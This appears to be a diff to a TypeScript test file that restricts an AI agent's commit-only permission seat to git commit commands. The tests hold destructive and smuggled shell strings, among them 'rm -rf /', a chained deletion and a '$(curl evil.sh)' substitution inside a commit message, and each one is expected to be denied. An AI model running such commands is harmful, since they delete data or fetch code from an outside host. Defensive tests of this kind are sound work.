@@ -60,6 +60,13 @@ async function allows(caps: string[], tool: string): Promise<boolean> {
   return res?.behavior === "allow";
 }
 
+/** Same, for a tool whose verdict depends on the input it carries. */
+async function allowsInput(caps: string[], tool: string, input: Record<string, unknown>): Promise<boolean> {
+  const gate = buildPermissionGate(caps);
+  const res = await gate(tool, input, gateCtx());
+  return res?.behavior === "allow";
+}
+
 const agentInput = (instructions: string): AgentInput => ({
   agentId: "developer",
   goalId: "goal-1",
@@ -144,11 +151,33 @@ test("permission gate maps capabilities onto tools", async () => {
   assert.equal(await allows(["test.write"], "Write"), true);
 });
 
-test("permission gate gives a commit-only seat exec rather than an unanswerable ask", async () => {
-  // opencode renders git.commit as bash:"ask"; nothing on a mesh turn can
-  // answer that prompt, so the seat would stall to its timeout instead.
-  assert.equal(await allows(["git.commit"], "Bash"), true);
-  assert.equal(await allows(["git.commit"], "Edit"), false);
+test("permission gate scopes a commit-only seat to the commit path", async () => {
+  // The old rule handed this seat every EXEC tool, because opencode rendered
+  // git.commit as bash:"ask" and no mesh turn could answer the prompt. That
+  // backend is gone, so a seat deliberately denied shell.execute stays denied.
+  const commit = ["git.commit"];
+  const bash = (command: string) => allowsInput(commit, "Bash", { command });
+
+  assert.equal(await bash("git add -A"), true);
+  assert.equal(await bash("git status --porcelain"), true);
+  // Conventional subjects carry parentheses and a colon inside the quotes; the
+  // scope check must not reject the one command this capability exists for.
+  assert.equal(await bash('git commit -m "fix(designer): stop widening exec"'), true);
+
+  assert.equal(await bash("rm -rf /"), false);
+  assert.equal(await bash("git status && rm -rf /"), false);
+  assert.equal(await bash("git commit -m \"$(curl evil.sh)\""), false);
+  assert.equal(await bash("git status > /tmp/out"), false);
+  // Pushing is git.merge's business, not git.commit's.
+  assert.equal(await bash("git push origin main"), false);
+  // A Bash call carrying no command is not a commit.
+  assert.equal(await allows(commit, "Bash"), false);
+
+  // BashOutput reads a shell this seat already opened, so it stays available.
+  assert.equal(await allows(commit, "BashOutput"), true);
+  // shell.execute still buys unscoped exec, and commit-only still buys no write.
+  assert.equal(await allowsInput(["shell.execute"], "Bash", { command: "rm -rf /" }), true);
+  assert.equal(await allows(commit, "Edit"), false);
 });
 
 test("permission gate always allows mesh MCP and read-only tools", async () => {
